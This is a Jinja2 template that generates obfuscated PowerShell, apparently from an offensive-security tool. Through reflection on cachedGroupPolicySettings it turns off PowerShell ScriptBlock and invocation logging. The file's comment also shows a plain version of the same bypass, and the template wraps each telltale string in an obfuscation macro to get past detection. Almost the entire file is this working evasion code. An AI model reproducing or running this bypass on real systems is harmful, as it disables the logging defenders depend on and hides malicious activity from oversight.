{% from 'macros.jinja2' import obfuscate with context%}

{# Disable Logging. See https://www.cobbr.io/ScriptBlock-Logging-Bypass.html
    $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
    $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
    $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
    $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
#}

${{symbol_name("settings")}} = [Ref].{{obfuscate("Assembly")}}.{{obfuscate("GetType")}}.Invoke({{obfuscate("System.Management.Automation.Utils")}}).{{obfuscate("GetField")}}.Invoke({{obfuscate("cachedGroupPolicySettings")}},{{obfuscate("NonPublic,Static")}}).GetValue($null);
${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}] = @{}
${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}][{{obfuscate("EnableScriptBlockLogging")}}] = {{obfuscate("0")}}
${{symbol_name("settings")}}[{{obfuscate("ScriptBlockLogging")}}][{{obfuscate("EnableScriptBlockInvocationLogging")}}] = {{obfuscate("0")}}
